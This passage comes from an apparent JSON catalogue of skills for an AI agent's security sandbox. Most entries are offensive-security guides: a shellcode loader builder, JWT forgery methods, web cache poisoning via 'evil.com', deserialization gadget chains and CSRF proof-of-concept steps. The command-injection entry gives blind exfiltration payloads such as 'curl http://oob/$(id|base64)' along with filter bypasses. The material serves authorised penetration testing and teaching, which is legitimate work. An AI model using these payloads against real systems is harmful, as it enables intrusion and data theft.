搜一遍（`/var/minis/shared` + `/var/minis/skills` + `/usr/local/bin`），\n> 不许只 `find` 一个子目录就下结论。\n\n## 能力索引（维护中）\n\n| 能力 | 入口 |\n|---|---|\n| **能力入口体检（先跑这个）** | `sh /var/minis/shared/self/doctor.sh`（查悬空软链/持久层/`.l2s.`/依赖/**交付物生产线是否落位**） |\n| 移动端动态插桩（frida） | `/var/minis/shared/self/frida-kit/README.md`；命令 `ensure-frida` + `fhook`（连接必须 `-H 127.0.0.1:27042`；**frida 客户端一律用 `frun <超时> <命令...>` 派发**，禁前台跑） |\n| 📱 CloudStudy APK 生产线（交付物） | `shared/cloudstudy-apk/README.md`；一键重建 `nohup sh shared/cloudstudy-apk/tools/rebuild_apk.sh &` → 读 `tools/logs/rebuild.*.log` |\n| 📚 世赛云计算资料库生产线 | `shared/worldskills-cloud/tools/README.md`（`build_liquid.py` → study.html；`build_portal.py`；翻译脚本；`harvest/` 采集） |\n| 技能库扫荡/上架生产线 | `shared/skills-library/tools/`（`install_skills.sh`、`wrap_skills.py`、`gh_watch.py`、`refix.sh`） |\n| 技能库检索/安装（全量 3386 / 精编 2483 / 101 仓库） | canonical `/var/minis/shared/self/bin/skillctl.sh`（命令 `skillctl search/all/cat/show/install/repos/stats`） |\n| 2084 已装技能总控 | `omni find/list/show/rebuild`（`/var/minis/skills/omni/`，含 browse.html 可视化） |\n| 沙箱逆向工具链 / 跨架构仿真 | `/var/minis/skills/rev-sandbox/SKILL.md` |\n| glibc 运行\n\n…（完整内容见 SKILL.md）"}, {"name": "shellcode-stub", "cat": "offensive", "catLabel": "⚔️ 漏洞利用 · 红队", "star": false, "oneliner": "裸 shellcode → 可运行 native PoC 的包装器", "desc": "CONSTRUCT: wrap a raw shellcode blob into a runnable native PoC — a tiny C loader compiled with clang, whose exit code is the shellcode's return value. --os picks the loader: posix (mmap RW → memcpy → mprotect RX → call, default) or windows (VirtualAlloc RWX → memcpy → call → ExitProcess). --emit c dumps just the loader source. The last link in the write chain: asm-assemble → shellcode-stub → exec-observe (native) or qiling-emulate (cross-arch/cross-OS). Builds the exe; does NOT run it.", "bytes": 3869, "human": "3.8 KB", "path": "/var/minis/skills/shellcode-stub/SKILL.md", "subdirs": ["scripts"], "files": ["SOURCE.md"], "body": "# Shellcode Stub Wrapper\n\n**🔨 Construct tier — builds a runnable PoC around shellcode; does not run it.**\n\n## Workflow\n\nCloses the write-side chain. `asm-assemble` makes bytes; `shellcode-stub` turns those\nbytes into a **native executable** you can actually detonate or emulate:\n\n```\nasm-assemble ──→ sc.bin ──→ shellcode-stub ──→ poc ──→ exec-observe (native, ⚡ consent)\n                                                    └──→ qiling-emulate (cross-arch/OS, contained)\n```\n\n## What it does\n\nDrops the shellcode into a tiny C loader and compiles it with clang. **The loader's exit\ncode is the shellcode's return value**, so a `mov w0, #42; ret` PoC exits `42` — trivial\nto assert.\n\nTwo loader templates, picked by `--os`:\n\n| `--os` | loader | OS | default target |\n|---|---|---|---|\n| `posix` (default) | `mmap` RW → `memcpy` → `mprotect` RX → call as `int(void)` | Linux / macOS | host |\n| `windows` | `VirtualAlloc` RWX → `memcpy` → call as `int(void)` → `ExitProcess(r)` | Windows PE | `x86_64-w64-mingw32` |\n\n- `--emit exe` (default) — the compiled PoC (needs clang).\n- `--emit c` — just the loader source, to inspect/tweak or hand to `cc-build`. Needs no\n  compiler at all — works even when the toolchain for the target OS isn't installed.\n- `--arch` / `--target` — build a stub for **another** arch, to run under\n  `qiling-emulate`. Native host-arch is the guaranteed path; a cross-**OS** `--target`\n  needs a cross sysroot/toolchain — pass it via `--cflags \"--sysroot=… -fuse-ld=lld\"`,\n  else the link fails honestly.\n- Input from a `.bin` file or `--hex \"48c7c0…\"`.\n\n## Safety\n\n`executes_input: no` — it BUILDS the exe, never runs it. Running the result is the\ndynamic tier's job (`exec-observe`, consent-gated) or a contained emulator\n(`qiling-emulate`).\n\n## Usage — the full loop (POSIX)\n\n…（完整内容见 SKILL.md）"}, {"name": "skill-creator", "cat": "meta", "catLabel": "🧭 总路由 · 元技能", "star": false, "oneliner": "创建 / 更新技能的规范指南（SKILL.md 结构与写法）", "desc": "Guide for creating effective skills. This skill should be used when users want to create a new skill (or update an existing skill) that extends Claude's capabilities with specialized knowledge, workflows, or tool integrations.", "bytes": 3921, "human": "3.8 KB", "path": "/var/minis/skills/skill-creator/SKILL.md", "subdirs": [], "files": [], "body": "# Skill Creator\n\nThis skill provides guidance for creating effective skills.\n\n## About Skills\n\nSkills are modular, self-contained packages that extend Claude's capabilities by providing\nspecialized knowledge, workflows, and tools. Think of them as \"onboarding guides\" for specific\ndomains or tasks—they transform Claude from a general-purpose agent into a specialized agent\nequipped with procedural knowledge that no model can fully possess.\n\n### What Skills Provide\n\n1. Specialized workflows - Multi-step procedures for specific domains\n2. Tool integrations - Instructions for working with specific file formats or APIs\n3. Domain expertise - Company-specific knowledge, schemas, business logic\n4. Bundled resources - Scripts, references, and assets for complex and repetitive tasks\n\n## Core Principles\n\n### Concise is Key\n\nThe context window is a public good. Skills share the context window with everything else Claude needs: system prompt, conversation history, other Skills' metadata, and the actual user request.\n\n**Default assumption: Claude is already very smart.** Only add context Claude doesn't already have. Challenge each piece of information: \"Does Claude really need this explanation?\" and \"Does this paragraph justify its token cost?\"\n\nPrefer concise examples over verbose explanations.\n\n### Set Appropriate Degrees of Freedom\n\nMatch the level of specificity to the task's fragility and variability:\n\n- **High freedom (text-based instructions)**: Use when multiple approaches are valid.\n- **Medium freedom (pseudocode or scripts with parameters)**: Use when a preferred pattern exists.\n- **Low freedom (specific scripts, few parameters)**: Use when operations are fragile, consistency is critical, or a specific sequence must be followed.\n\n### Anatomy of a Skill\n\n…（完整内容见 SKILL.md）"}, {"name": "specialized-file-analyzer", "cat": "triage", "catLabel": "🔎 通用侦查 · 分诊", "star": false, "oneliner": "特殊文件深析：.NET 及标准 PE 之外的分析路径", "desc": "Analyze specialized file types beyond standard PE executables - .NET assemblies, Office macros, PDFs, PowerShell scripts, JavaScript, archives, HTA files, disk images (ISO/IMG/VHD/VHDX), and Linux ELF binaries. Use when you encounter documents, scripts, disk images, or non-Windows executables that require format-specific analysis tools and techniques. Claude runs the extraction and deobfuscation tooling on the host itself; nothing is executed.", "bytes": 42398, "human": "41.4 KB", "path": "/var/minis/skills/specialized-file-analyzer/SKILL.md", "subdirs": [], "files": ["SOURCE.md"], "body": "# Specialized File Analyzer\n\nExpert analysis of non-PE file formats commonly used in malware campaigns: .NET, Office documents, PDFs, scripts, HTA files, disk images, archives, and Linux binaries.\n\n## When to Use This Skill\n\nUse this skill when analyzing:\n- **.NET/C# assemblies** (.exe, .dll with .NET framework)\n- **Office documents** with macros (.docm, .xlsm, .doc, .xls)\n- **PDF files** (suspicious attachments, exploit documents)\n- **Scripts** (PowerShell .ps1, VBScript .vbs, JavaScript .js)\n- **HTA files** (.hta — HTML Applications executed by mshta.exe)\n- **Disk images** (.iso, .img, .vhd, .vhdx — container formats that bypass MOTW)\n- **Archives** (.zip, .rar, .7z, .tar.gz)\n- **Shortcuts** (.lnk files)\n- **Linux binaries** (ELF executables)\n- **Batch files** (.bat, .cmd)\n\n**Key indicator:** `file` command shows non-PE32 executable or document type.\n\n## Execution Model\n\n- **You run the commands.** Every `bash` block in this skill is for you to execute on the host, then read and interpret. Do not ask the user to run tools and paste output unless a tool is missing and cannot be installed.\n- **Locate skill files.** Scripts and reference files ship in this skill's directory. Set `R=\"${CLAUDE_PLUGIN_ROOT:-<dir containing this SKILL.md>}\"` once (when installed as a plugin `$CLAUDE_PLUGIN_ROOT` is set; otherwise it is this skill folder). Your working directory is the user's analysis workspace, so prefix every script path below with `$R`, e.g. `python3 \"$R\"/scripts/ioc_extract.py`.\n- **Nothing gets executed.** Decompile, extract, decode, beautify, grep — never run the sample, a macro, a script, or an extracted payload on the host. Blocks marked **VM only** (PowerShell, `cscript`, `strace`, dnSpy debugging) are for the analyst in the isolated VM; hand them over as instruction\n\n…（完整内容见 SKILL.md）"}, {"name": "spider-king", "cat": "mobile", "catLabel": "📱 移动安全评估", "star": false, "oneliner": "Pure-web protocol reverse skill: turn hostile browser clients into brows", "desc": "Pure-web protocol reverse skill: turn hostile browser clients into browser-free Python collectors. Auto-judge intake and tool path from signals: artifact-only first when samples suffice; for a fresh web live-target, collect sequential fingerprint-baseline then debugger-trace evidence (default chrome-devtools then js-reverse; upgrade baseline host to Camoufox/managed profile only on fingerprint pressure); for continuation, reuse the current gate when target and environment are unchanged. Route only mounted web-relevant MCP families. Out of primary scope: APK, native app, and mini-program reverse as the main path. Use for hostile web sign, token, cookie, WebSocket, GraphQL, protobuf, response-decode, browser-fingerprint, WebAssembly, challenge-bootstrap, dynamic-font, or protocol-collector flows.", "bytes": 29342, "human": "28.7 KB", "path": "/var/minis/skills/spider-king/SKILL.md", "subdirs": ["agents", "references", "scripts", "tests"], "files": ["LICENSE", "README.md", "SOURCE.md"], "body": "# Spider King\n\n## Mission\n\nTurn hostile web clients into stable protocol collectors.\n\nThis is a pure-web protocol-recovery skill, not a browser-automation skill and not an APK/mini-program reverse skill. Use browser tooling only to gather web evidence. Deliver raw HTTP plus narrow local sign, bootstrap, decode, or transport helpers. If the primary target is APK, native app, or mini-program, state out-of-scope instead of inventing a web dual-browser first-pass.\n\n## Non-Negotiables\n\n- Before any tool choice on a fresh task, run the Auto Judge Card in this file and `references/mcp-routing-playbook.md`: decide intake, whether a browser is needed, which baseline host to use, and whether `js-reverse` is required. Do not open tools first and rationalize later.\n- Start every fresh web target classified as `live-target` with sequential evidence for both roles before claiming that live web target is understood: `fingerprint-baseline` then `debugger-trace`. Default means are `chrome-devtools` then `js-reverse`. When fingerprint pressure is proved, the baseline host may be Camoufox or another managed profile; debugger-trace still prefers `js-reverse` only after a real handoff and only when a debug attach surface exists. This skill's primary scope is web clients only; APK, native app, and mini-program primary tasks are out of scope and must not invent paired-browser proof as ceremony. If a required role or its available means is missing for a web live-target, report the blocker before claiming the live target is understood.\n- Keep browser evidence collection target-serial: at most one tool family may be `TARGET_ACTIVE`, and never place both families in the same parallel tool batch. Apply the handoff gate in `references/tool-playbook.md`; preserve unique unreplayable state with `RETA\n\n…（完整内容见 SKILL.md）"}, {"name": "syscall-trace", "cat": "debug", "catLabel": "🐞 调试 · 仿真 · 追踪", "star": false, "oneliner": "系统调用追踪：strace / dtruss", "desc": "DYNAMIC: run a target under a syscall tracer (strace on Linux, dtruss on macOS) and summarize its behaviour — files opened, network connects, processes exec'd, and a syscall histogram. EXECUTES the target; consent-gated. dtruss needs root + a permissive SIP.", "bytes": 1504, "human": "1.5 KB", "path": "/var/minis/skills/syscall-trace/SKILL.md", "subdirs": ["scripts"], "files": ["SOURCE.md"], "body": "# Syscall Tracer\n\n**⚡ Dynamic tier — runs the target.** Run only where you don't mind the risk.\n\n## When to use\n\nThe core behavioral question: *what does this sample actually do to the system?*\n`syscall-trace` runs it under a syscall tracer and tells you the files it touched, the\nnetwork it reached, the processes it spawned, and its syscall profile — the real\nground truth behind static findings.\n\n## What it does\n\nRuns the target under **`strace`** (Linux) or **`dtruss`** (macOS) with a timeout, then\nsummarizes: files opened, network (`connect`/`socket`), execs, and a syscall histogram.\n\n## Consent & prerequisites\n\n- Dynamic: `rekit run --allow-dynamic syscall-trace <target>` (or `--yes-i-consent` /\n  `REKIT_ALLOW_DYNAMIC=1` for a direct call).\n- **`strace`** (Linux) or **`dtruss`** (macOS) on PATH. On macOS, `dtruss` needs **root\n  and a permissive SIP**; on Linux, `strace` needs ptrace permissions. Absent → `doctor`\n  marks it not-ready with an install hint.\n\n## Usage\n\n```bash\nrekit run --allow-dynamic syscall-trace ./sample --timeout 20\nrekit run --allow-dynamic syscall-trace ./sample --format json | ...\n```\n\nPipe the recovered files/IPs into `ioc-extract` for a report.\n"}, {"name": "universal-reverse-engineering", "cat": "static", "catLabel": "⚙️ 静态分析 · 反编译", "star": true, "oneliner": "万能逆向：Android/原生/跨格式自动选工具链（拿不准就看它）", "desc": "Universal reverse engineering skill for Android (APK/XAPK/JAR/AAR), iOS (IPA/dylib), Windows (PE/EXE/DLL/SYS), Linux (ELF/SO), macOS (Mach-O/dylib/framework), and .NET assemblies. Auto-detects the target format, selects the right toolchain, and produces structured analysis: architecture, strings, imports/exports, disassembly, decompiled source, and call-flow documentation. Also detects 40+ vulnerability classes in both source code and compiled binaries.", "bytes": 11178, "human": "10.9 KB", "path": "/var/minis/skills/universal-reverse-engineering/SKILL.md", "subdirs": ["references", "scripts"], "files": ["SOURCE.md"], "body": "# Universal Reverse Engineering & Vulnerability Detection\n\nThis skill handles reverse engineering and vulnerability analysis for every major binary\nand source format. It auto-detects the target type and routes to the correct toolchain.\n\n## Supported Targets\n\n| Platform | Formats | Primary Tools |\n|----------|---------|---------------|\n| Android | APK, XAPK, JAR, AAR, DEX | jadx, apktool, dex2jar |\n| iOS | IPA, dylib, framework | class-dump, otool, nm, ipsw |\n| Windows | EXE, DLL, SYS, OCX (PE32/PE64) | pe-analyzer, strings, objdump, capa |\n| Linux | ELF (x86/x86_64/ARM/MIPS) | readelf, objdump, nm, strings, ltrace |\n| macOS | Mach-O, dylib, framework, .app | otool, nm, codesign, strings |\n| .NET | EXE, DLL, nupkg | ilspycmd, monodis |\n| Generic | Any binary | binwalk, file, strings, radare2 |\n| Source | C/C++, Python, Java, JS, Go, Rust | semgrep, cppcheck, bandit, flawfinder |\n\n---\n\n## Phase 0: Auto-Detect Target\n\nBefore choosing a toolchain, identify what the target actually is.\n\n**Action**: Run the detect script.\n\n```bash\nbash ${CLAUDE_PLUGIN_ROOT}/skills/universal-reverse-engineering/scripts/detect-target.sh <file>\n```\n\nThe script outputs a machine-readable type line:\n- `TARGET_TYPE:android-apk`\n- `TARGET_TYPE:android-xapk`\n- `TARGET_TYPE:android-jar`\n- `TARGET_TYPE:ios-ipa`\n- `TARGET_TYPE:ios-macho` (single Mach-O binary from IPA or standalone)\n- `TARGET_TYPE:windows-pe32`\n- `TARGET_TYPE:windows-pe64`\n- `TARGET_TYPE:windows-dotnet`\n- `TARGET_TYPE:linux-elf`\n- `TARGET_TYPE:macos-macho`\n- `TARGET_TYPE:dotnet-assembly`\n- `TARGET_TYPE:source-c`\n- `TARGET_TYPE:source-python`\n- `TARGET_TYPE:source-java`\n- `TARGET_TYPE:source-javascript`\n- `TARGET_TYPE:unknown`\n\nRoute to the appropriate section below based on this output.\n\n---\n\n…（完整内容见 SKILL.md）"}, {"name": "unpack", "cat": "triage", "catLabel": "🔎 通用侦查 · 分诊", "star": false, "oneliner": "递归解包到不动点：zip/tar/gz/xz/7z/自解压/固件镜像层层剥", "desc": "Recursively extract archives to a fixpoint: zip / tar(.gz/.bz2/.xz) / gz / bz2 / xz / asar (Electron) / ar / .deb with the pure-stdlib core, 7z and RAR via an external CLI (7z/7za/7zz, unar) when present. Walks the output for nested archives and extracts those too. Guards against zip-slip (path traversal) and decompression bombs (byte budget). Extraction is not execution — contents are written, never run.", "bytes": 2372, "human": "2.3 KB", "path": "/var/minis/skills/unpack/SKILL.md", "subdirs": ["scripts"], "files": ["SOURCE.md"], "body": "# Archive Unpacker (recursive, safe)\n\nRecursively extract archives to a fixpoint — safely, on untrusted input. Pure-stdlib\ncore; `.7z`/`.rar` via a CLI when present.\n\n## When to use\n\nMalicious code hides behind packing: a dropped `.zip` holds a `.tar.gz` holds the\npayload; an npm tarball wraps the install script. Extract first, then scan/decompile\nthe revealed tree (`pyc-decompile`, the `*-analyze` skills, `js-covert-scan`, …).\n\n## What it does\n\n- **Formats** — `zip`, `tar` (+`.gz`/`.bz2`/`.xz`), plain `gz`/`bz2`/`xz`, **`asar`**\n  (Electron `app.asar`), and **`ar`/`.deb`** (the inner control/data tarballs are then\n  recursed into) with the standard library (portable, no deps). `7z` and `rar` shell\n  out to `7z`/`7za`/`7zz`\n  or `unar`/`unrar` **if on PATH**; if not, they're reported in `toolsMissing`\n  (honest gap — nothing silently skipped).\n- **Recursive** — after extracting, it walks the output for nested archives and\n  extracts those too, up to a depth cap, deduping by content hash.\n\n## Safety (this extracts untrusted archives)\n\n- **Zip-slip / path traversal** — every member must resolve *inside* the output dir;\n  absolute paths, `..`, and out-of-tree symlinks are skipped (tar uses the stdlib\n  `data` filter on Python 3.12+).\n- **Decompression bombs** — a total-bytes budget (default 512 MiB) and per-file cap\n  stop runaway output; over-budget members land in `skipped`.\n- Extraction is **not** execution — contents are written to disk, never run.\n\n## Usage\n\n```bash\nrekit run unpack ./suspicious.tgz ./out\nrekit run unpack ./dropper.zip ./out --max-depth 12 --max-bytes 1073741824\n```\n\nReturns JSON: `{format, extractedTo, fileCount, nestedArchives, skipped, toolsMissing}`.\n\n## Prerequisites\n\n…（完整内容见 SKILL.md）"}, {"name": "variant-analysis", "cat": "diff", "catLabel": "🔀 差分 · 变体分析", "star": false, "oneliner": "变体猎杀：已找到一个漏洞后，找它的所有同类", "desc": "Hunts for the other instances of a bug already found — the variants of one root cause across a codebase. Use immediately after a vulnerability, logic bug, or bad pattern turns up in a specific file and the question becomes where else it occurs, including the bare conversational form (\"are there others like this?\", \"is this the same bug?\"). Also for generalizing one known instance into a CodeQL or Semgrep query for its whole pattern family, and for triaging a set of look-alike candidates against a known root cause. Not for initial discovery with no bug in hand.", "bytes": 3903, "human": "3.8 KB", "path": "/var/minis/skills/variant-analysis/SKILL.md", "subdirs": ["agents", "assets", "references", "resources"], "files": ["SOURCE.md"], "body": "# Variant Analysis\n\nFind the other instances of a bug you have already found. One root cause usually has several\nmanifestations, and they are rarely in the module where you found the first one.\n\n## When to Use\n\n- A vulnerability has been found and you need to search for similar instances\n- Building or refining CodeQL/Semgrep queries for security patterns\n- Performing systematic code audits after an initial issue discovery\n- Analyzing how a single root cause manifests in different code paths\n\n## When NOT to Use\n\n- Initial vulnerability discovery — use audit-context-building or a domain-specific audit\n- General code review with no known pattern to search for\n- Writing fix recommendations — use issue-writer\n- Understanding unfamiliar code — use audit-context-building first\n\n## The Five Steps\n\nRead the reference for a step when you reach it.\n\n**1. Understand the original issue.** Extract the root cause — why the code is wrong, not\nwhat it does — and enumerate the directions a variant could hide in: related identifiers,\nother manifestations of the same mistake, data-type edge cases.\n→ [references/root-cause.md](references/root-cause.md)\n\n**2. Create an exact match.** Write a pattern matching ONLY the known instance and confirm\nit hits. A pattern that matches nothing means you have misunderstood the bug, and every\nsearch built on it is calibrated against the wrong code.\n\n**3–4. Generalize one element at a time.** Climb from the exact match toward the pattern\nfamily, running and reading all matches after each single change. Stop when more than half\nthe matches are noise.\n→ [references/searching.md](references/searching.md) — abstraction ladder, tool selection,\nfalse-positive filters\n\n…（完整内容见 SKILL.md）"}, {"name": "web-arsenal", "cat": "static", "catLabel": "⚙️ 静态分析 · 反编译", "star": false, "oneliner": "One line: web enumeration + exploitation tool arsenal for authorized eng", "desc": "One line: web enumeration + exploitation tool arsenal for authorized engagements. Trigger signals: port 80/443/8080/8443 open, \"web\", a URL to a lab target, an HTTP service surfaced by recon. Authorized, in-scope targets only.", "bytes": 7525, "human": "7.3 KB", "path": "/var/minis/skills/web-arsenal/SKILL.md", "subdirs": [], "files": [], "body": "# Web enumeration & exploitation arsenal\n\nAuthorized, in-scope targets only. Add `target.tld` to `/etc/hosts` first; many\napps only respond to their vhost name, not the raw IP.\n\n## 1. Fingerprint (what am I looking at)\n**whatweb** — fastest first look; identifies CMS/server/framework in one shot.\n`whatweb -a3 http://target.tld` — `-a3` = aggressive plugins (more detail, more requests).\n**httpx** — best for triaging many hosts/vhosts at once.\n`httpx -title -tech-detect -status-code -u http://target.tld` — title + tech stack + code.\n**curl** — ground truth; no interpretation between you and the bytes.\n`curl -sI http://target.tld` — `-s` silent, `-I` headers only (Server, redirects, cookies).\n`curl -s -H 'Host: dev.target.tld' http://target.tld/` — hit a vhost without editing hosts.\nGotcha: `-I` sends HEAD; some apps 405/behave differently — use `curl -s ... -o /dev/null -D -` for a real GET with headers.\n**Wappalyzer** — browser extension; confirms JS frameworks curl can't see rendered.\n**nikto** — noisy misconfig/known-file scanner; good on legacy targets, useless stealth.\n`nikto -h http://target.tld` — Gotcha: hammers the server; run once, not in a loop.\n\n…（完整内容见 SKILL.md）"}, {"name": "web-auth-jwt", "cat": "static", "catLabel": "⚙️ 静态分析 · 反编译", "star": false, "oneliner": "Attack JWT/session authentication. Load when auth uses a JWT (three base", "desc": "Attack JWT/session authentication. Load when auth uses a JWT (three base64url parts, header.payload.signature), Authorization: Bearer, or you see alg/kid/jku fields. Signals: eyJ... tokens, \"alg\":\"none\"/\"HS256\"/\"RS256\", kid header, JWKS endpoints, role/admin claims.", "bytes": 2498, "human": "2.4 KB", "path": "/var/minis/skills/web-auth-jwt/SKILL.md", "subdirs": [], "files": ["cheatsheet.md"], "body": "# JWT / token authentication attacks\n\n## When it applies\nThe app authenticates with a JSON Web Token and trusts claims inside it (user id, role,\n`isAdmin`). The win is forging a valid-looking token the server accepts.\n\n## Why it works\nJWTs are only as safe as their signature verification. Implementations routinely skip it,\nconfuse algorithms, or trust attacker-controlled key hints (`kid`, `jku`, `x5u`). If you can\nmake the server accept a signature you produced, you own every claim.\n\n## Method\n> **Payloads & full variation set:** [`cheatsheet.md`](cheatsheet.md) next to this file — work the set, not the first line.\n1. **Decode & read claims**: `jwt_tool <token>` — look for `role`, `admin`, `sub`, weak `exp`.\n2. **alg=none**: strip the signature and set header `{\"alg\":\"none\"}`; some libs accept it.\n3. **Algorithm confusion RS256→HS256**: if the server verifies RS256 with the *public* key,\n   re-sign HS256 using that public key as the HMAC secret — server verifies with the same key.\n   `jwt_tool -X k -pk public.pem`.\n4. **Weak HMAC secret**: crack HS256 offline — `hashcat -m 16500 token.txt rockyou.txt`; if it\n   falls, mint any token.\n5. **kid / jku / x5u abuse**: `kid` path traversal or SQLi to control the key file; `jku`/`x5u`\n   pointing at *your* JWKS so the server fetches your public key and you sign with your private key.\n\n## Gotchas\n- Editing claims without re-signing fails unless verification is broken — confirm the vuln class first.\n- `exp`/`nbf` may be enforced even when signature isn't — keep timestamps valid.\n- Public key sourcing: grab it from `/.well-known/jwks.json`, a cert, or TLS if not published.\n\n…（完整内容见 SKILL.md）"}, {"name": "web-cache-poisoning", "cat": "static", "catLabel": "⚙️ 静态分析 · 反编译", "star": false, "oneliner": "Web cache poisoning & deception — get a shared cache to serve attacker c", "desc": "Web cache poisoning & deception — get a shared cache to serve attacker content to other users, or trick it into caching victims' private pages. Load behind a CDN/cache (Cloudflare, Varnish, Fastly, Akamai), on unkeyed headers, `X-Forwarded-Host`, cache headers, or static-looking URLs. Signals: `Age`/`X-Cache` headers, CDN, reflected headers.", "bytes": 2560, "human": "2.5 KB", "path": "/var/minis/skills/web-cache-poisoning/SKILL.md", "subdirs": [], "files": [], "body": "# Web cache poisoning & deception\n\n## When it applies\nA shared cache (CDN/reverse proxy) sits in front of the app. Poisoning: an unkeyed input\ninfluences the response but isn't part of the cache key, so your malicious response gets stored\nand served to everyone. Deception: the cache is tricked into storing a victim's private page.\n\n## Why it works\nCaches key on some request parts (URL, maybe some headers) and ignore others (\"unkeyed\"). If an\nunkeyed header/param changes the response (reflected `X-Forwarded-Host`, a header-driven script\nsrc), you poison the cached copy. Deception exploits path/extension rules that cache things that\nshouldn't be cached.\n\n## Method\n1. **Map cache behaviour**: `X-Cache: hit/miss`, `Age`, `Cache-Control`, CDN vendor. Send a\n   cache-buster param to test safely without poisoning the real key.\n2. **Find unkeyed inputs** with Burp **Param Miner** (\"guess headers\"): `X-Forwarded-Host`,\n   `X-Forwarded-Scheme`, `X-Host`, custom headers reflected into the response.\n3. **Poison (carefully)**: make the unkeyed input inject a payload (e.g. `X-Forwarded-Host:\n   evil.com` → a script/link src) that reflects into a cacheable response; confirm it's stored\n   and served to a clean request.\n4. **Deception**: request `/account.php/nonexistent.css` — if the cache stores the private page\n   under the static-looking URL, another user can fetch victims' cached data.\n\n## Gotchas\n- Test with a unique cache-buster so you don't poison production for real users; then prove one controlled hit.\n- Impact = what the poisoned response does (XSS, redirect, defacement) × who receives it.\n- CDNs normalize/strip headers differently — the win is a specific input this cache doesn't key on.\n\n…（完整内容见 SKILL.md）"}, {"name": "web-command-injection", "cat": "static", "catLabel": "⚙️ 静态分析 · 反编译", "star": false, "oneliner": "Turn user input that reaches a shell into arbitrary OS command execution", "desc": "Turn user input that reaches a shell into arbitrary OS command execution. Load when a parameter feeds a system call — ping/nslookup/host tools, file conversion (ImageMagick, ffmpeg), archive/ export, PDF/thumbnail generation, filename handling, or any \"network tools\" feature. Signals: output that looks like command output, a value echoed into a system utility, blind time/OOB behaviour.", "bytes": 2885, "human": "2.8 KB", "path": "/var/minis/skills/web-command-injection/SKILL.md", "subdirs": [], "files": ["cheatsheet.md"], "body": "# OS command injection\n\n## When it applies\nA parameter is concatenated into a shell command the server runs (a `ping` diagnostic, an\n`ImageMagick`/`ffmpeg` convert, a `tar`/`zip`, a filename passed to a CLI). If the value reaches\n`/bin/sh -c` unsanitised, you can append your own command.\n\n## Why it works\nBuilding a command string from input and handing it to a shell means shell metacharacters keep their\nmeaning: `;`, `|`, `&&`, `$()`, and backticks all start a new command in the same context (usually\nthe web user). The app never intended a second command — the shell can't tell the difference.\n\n## Method\n> **Payloads & full variation set:** [`cheatsheet.md`](cheatsheet.md) next to this file — work the set, not the first line.\n1. **In-band test**: inject `; id`, `| id`, `$(id)`, `` `id` ``, and newline (`%0a id`). A `uid=…`\n   in the response confirms execution.\n2. **Blind (no output)** — pick one channel:\n   - **Time**: `; sleep 10` (or `%0a ping -c 10 127.0.0.1`) → response stalls ⇒ execution.\n   - **OOB**: `; nslookup $(whoami).<your-interactsh>` → a DNS/HTTP callback proves it and exfils.\n3. **Get output when blind**: redirect into a web-readable path, or exfil via the OOB channel\n   (`curl http://oob/$(id|base64)`).\n4. **Bypass filters**: `$IFS`/`${IFS}` for spaces, quotes to split keywords (`w'h'o'am'i`),\n   `$@`/`\\`, base64-decode-pipe, or wildcards for blocked paths.\n5. **Escalate to impact**: least-action proof (a benign `id`/OOB ping) — do not run destructive or\n   data-exfil commands beyond what proves impact.\n\n…（完整内容见 SKILL.md）"}, {"name": "web-csrf", "cat": "static", "catLabel": "⚙️ 静态分析 · 反编译", "star": false, "oneliner": "Cross-Site Request Forgery — force a victim's browser to perform state-c", "desc": "Cross-Site Request Forgery — force a victim's browser to perform state-changing actions. Load on state-changing requests (POST/PUT/DELETE) that rely only on cookies, missing/weak CSRF tokens, `SameSite=None`, or forms/JSON without anti-CSRF. Signals: cookie-only auth, no token, token not validated.", "bytes": 2290, "human": "2.2 KB", "path": "/var/minis/skills/web-csrf/SKILL.md", "subdirs": [], "files": [], "body": "# Cross-Site Request Forgery (CSRF)\n\n## When it applies\nA state-changing action authenticated purely by an ambiently-sent credential (cookie) with no\nunpredictable token the attacker's site can't know/replay.\n\n## Why it works\nBrowsers attach cookies to cross-site requests automatically. If the server accepts the action\non cookie alone, an attacker page can submit it on the victim's behalf. Anti-CSRF tokens /\n`SameSite` cookies break this by requiring something cross-site JS can't supply.\n\n## Method\n1. **Find a candidate**: a sensitive action (change email/password, transfer, role) that changes state.\n2. **Check the defenses**: is there a CSRF token? Is it *validated* (remove it / reuse another\n   user's / swap value)? Is the cookie `SameSite=Lax/Strict`? Is it a simple request (no preflight)?\n3. **Build the PoC**: auto-submitting HTML form (or `fetch` for simple requests) that fires the\n   action; host it and load it as the victim.\n4. **Bypass weak tokens**: token not tied to session, predictable, accepted when blank, only\n   checked if present, or leaked via GET/referer.\n5. **JSON endpoints**: try `Content-Type: text/plain`/form-encoding to avoid preflight; if the\n   API accepts it, CSRF applies.\n\n## Gotchas\n- `SameSite=Lax` (now default in Chrome) blocks most cross-site POST CSRF — look for `None`, GET-based actions, or method override.\n- Token present ≠ safe — always test that it's actually validated and bound to the session.\n- Login CSRF and CSRF chained with self-XSS are often the real impact.\n\n## Verify success\nLoading your PoC while authenticated as the victim performs the action (email changed, etc.)\nwith no interaction beyond visiting the page.\n\n## References\nPortSwigger CSRF labs; OWASP CSRF Prevention Cheat Sheet.\n"}, {"name": "web-deserialization", "cat": "static", "catLabel": "⚙️ 静态分析 · 反编译", "star": false, "oneliner": "Insecure deserialization → RCE via gadget chains. Load when the app dese", "desc": "Insecure deserialization → RCE via gadget chains. Load when the app deserializes attacker data: Java (rO0/AC ED base64), PHP `unserialize` (O:), Python pickle, .NET BinaryFormatter/ViewState, Ruby Marshal/YAML. Signals: serialized blobs in cookies/params, `__VIEWSTATE`, `rO0AB`, `O:8:`.", "bytes": 2334, "human": "2.3 KB", "path": "/var/minis/skills/web-deserialization/SKILL.md", "subdirs": [], "files": ["cheatsheet.md"], "body": "# Insecure deserialization\n\n## When it applies\nThe app takes serialized objects from the client (cookies, hidden fields, params, message\nqueues) and deserializes them. Recognizable by format markers.\n\n## Why it works\nDeserialization reconstructs objects and can invoke their methods (magic methods, readObject,\n`__wakeup`). A crafted object graph (\"gadget chain\") strings together existing library methods\nto reach a dangerous sink — command execution — during/after deserialization.\n\n## Method\n> **Payloads & full variation set:** [`cheatsheet.md`](cheatsheet.md) next to this file — work the set, not the first line.\n1. **Spot the blob & format**: Java `rO0AB`/`AC ED 00 05`, PHP `O:8:\"...\":`, .NET\n   `__VIEWSTATE`/`AAEAAAD`, Python pickle, Ruby Marshal `\\x04\\x08`.\n2. **Confirm it's deserialized untrusted**: tamper a byte → parse error/behaviour change.\n3. **Generate a gadget chain** with the right tool for a library on the classpath:\n   - Java: `ysoserial CommonsCollections1 'curl <collab>' | base64`\n   - PHP: `phpggc Monolog/RCE1 system id` (pick a gadget matching a loaded framework)\n   - .NET: `ysoserial.net` (ViewState needs the MAC key or 